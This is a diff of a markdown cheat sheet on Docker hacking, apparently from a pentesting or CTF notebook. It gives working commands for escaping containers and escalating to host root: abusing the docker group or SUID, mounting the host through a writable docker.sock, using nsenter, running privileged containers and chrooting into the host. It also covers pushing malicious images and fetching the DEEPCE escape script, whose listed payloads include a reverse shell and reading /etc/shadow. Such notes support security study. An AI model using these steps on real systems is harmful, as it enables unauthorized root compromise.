@@ -1,14 +1,36 @@
 # Docker Hacking
 
 
-For basic information about docker try here: [[Docker]].
-Containers have networking capabilities and their own file storage. They achieve this by using three components of the Linux kernel:
+For basic information about docker try here: [[Docker]]. Typically you are trying to escape from a container and generally these escapes stem from misconfigurations of the container from services or access controls. 
 
--   Namespaces - segregate system resources such as processes, files, and memory away from other namespaces.
--   Cgroups - Cgroups are used by containerization software such as LXC or Docker
--   OverlayFS
+Docker is a client-server model:
+- The Docker Daemon - does amongst many things:
+	- Runs Docker containers
+	- Interacts with Docker containers
+	- Manages the Docker containers on the host system.
+	- Handles Docker Volumes - persistent data storage
+	- Logging and Monitoring 
+		- Captures container logs
+		- Provides insight into container activities, errors, and debugging information.
+		- Monitor resource utilisation
+- The Docker Client
+	- Communicate to Docker Daemon with API or Unix Socket
+	- Docker Client != Docker Compose
+- Docker Compose 
+	- Orchestration with [[YAML]] files
+- Docker Desktop
+	- GUI application for managing Docker Containers and components available for Linux, Windows and MacOS
+- Docker Images
+	- Created with a Dockerfile
+- Docker Container
+	- An instance of a Docker Image providing an executable environment 
 
-Typically you are trying to escape from a  container and general these escapes stem from misconfigurations of the container from services or access controls.
+Containers have networking capabilities and their own file system and achieve this through using three components of the Linux kernel:
+- Namespaces - segregate system resources such as processes, files, and memory away from other namespaces.
+- Cgroups - Cgroups are used by containerization software such as LXC or Docker
+- OverlayFS
+
+
 
 ## How to know when you are in a container?
 
@@ -119,7 +141,29 @@ docker -H $remotehost run -v /:/mnt --rm -it -d $image:$tag
 docker -H $remotehost run -v /:/mnt --rm -it $image:$tag chroot /mnt sh
 ```
 
+## Host to Docker to Host Privilege Escalation
+#### Abuse Through Group Permissions - Docker, Sudoers Group and SUID permissions
+
+To gain root privileges through Docker we need to be part of the Docker or Sudoers Group or the Docker client has the SUID bit set 
+```bash
+id
+ls -la $(which docker)
+```
+If we are of the groups mentioned above or SUID bit is set we can escalate through the container and mount back onto the host file system as the root user of the Docker Container.
+
+#### Writable Docker Socket
+
+To gain root privileges through Docker we need to be part of the Docker Group or root user the Docker client or it has the SUID bit set, **and the Docker Socket is writable**.
+```bash
+# Typically
+ls -la /var/run/docker.sock
+find / -type f -name docker.sock 2>/dev/null
+
+# Then mount 
+docker -H unix:///$path/$to/$the/docker.sock run -v /:/mnt --rm -it $image chroot /mnt bash
+```
 ## Host to Docker Hacking 
+
 #### Abusing Docker Registry
 
 [Docker registries](https://docs.docker.com/registry/) are stateless server side application stores the Docker Image. Registries store and provide Docker images for use. Private registries contain various called a **tag**. The Docker Registry is a JSON endpoint query it with 
@@ -140,6 +184,7 @@ docker pull app/app:$TAG
 [Dive](https://github.com/wagoodman/dive) is a tool for exploring each layer in a docker image. 
 
 #### Uploading Malicious Docker Images
+
 Dockerfile 
 ```docker
 FROM $image:
@@ -158,6 +203,17 @@ docker push
 ```
 
 ## Docker Escapes
+
+#### Docker Shared Directories
+
+Shared Directories (Volume Mounts) are connected host and guest file systems, which are mounted with Read-Only or Read-Write permissions. 
+- Read access to get:
+	- Credentials
+	- `ssh` keys - see [[SSH-Cheatsheet]]
+- Write access to:
+	- Write [[Web-Shells]]
+	- Write [[Persistence]] mechanisms
+	- Write Reverse Shells - [[Reverse-Shells-Listing]]
 
 #### Shared Namespaces
 
@@ -181,6 +237,7 @@ nsenter --target 1 --mount --uts --ipc --net /bin/bash
 ```
 
 #### Misconfigured Privileges
+
 If a docker container is running with privileged mode it bypasses the Docker engine and has direct communication with host OS. List container capabilities with:
 ```bash
 capsh --print | grep # admin chroot sys_module sys_time
@@ -228,10 +285,54 @@ ls /
 chroot /mnt # Now go full linux pirate and board the container 
 ```
 
-## Docker Hacking Utilities
+#### Creating Privileged Containers
 
-## Tools
+Use the Docker Client to make a privileged container
+```bash
+docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem $DockerImageName
+# Check if Container is operational
+docker -H unix:///app/docker.sock ps
+# Get Shell on Docker through the Docker Client
+docker -H unix:///app/docker.sock exec -it $IDstring /bin/bash
+```
 
+## Docker Hacking Tools
+
+#### Docker Client
+
+Download to the Docker Client: [https://master.dockerproject.org/linux/x86_64/docker](https://master.dockerproject.org/linux/x86_64/docker) to interact with Docker Daemons, see [[Docker]] for more legitimate uses and use cases.
+
+#### DEEPCE
+
+[GitHub - deepce](https://github.com/stealthcopter/deepce) - Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) is: A pure `sh` script with no dependencies, which can make use of additional tools such as `curl`, `nmap`, `nslookup` and `dig` if available to perform in-memory only enumeration. *..however most of the exploits create new containers which will cause disk writes, and some exploits will overwrite `runC` which can be destructive, so be careful!*
+
+The following is the list of enumerations performed by DEEPCE:
+- Container ID & name (via reverse dns)
+- Container IP / DNS Server
+- Docker Version
+- Interesting mounts
+- Passwords in common files
+- Environment variables
+- Password hashes
+- Common sensitive files stored in containers
+- Other containers on same network
+- Port scan other containers, and the host machine itself
+- Find exposed docker soc
+Exploits:
+- Docker Group Privilege Escalation
+- Privileged mode host command execution
+- Exposed Docker Sock
+For each of the exploits above payloads can be defined in order to exploit the host system. These include:
+- Reverse TCP shell
+- Print /etc/shadow
+- Add new root user
+- Run custom commands
+- Run custom payload binaries
+
+```bash
+wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
+curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
+```
 ## Tricks
 
 #### Where to escape on the network with - No ping and you need to pivot
@@ -281,3 +382,4 @@ Netcat
 [AppArmor](https://docs.docker.com/engine/security/apparmor/)
 [THM Container Vulnerabilities](https://tryhackme.com/room/containervulnerabilitiesDG)
 [dockerd Documentation](https://docs.docker.com/engine/reference/commandline/dockerd/)
+[GitHub - deepce](https://github.com/stealthcopter/deepce)
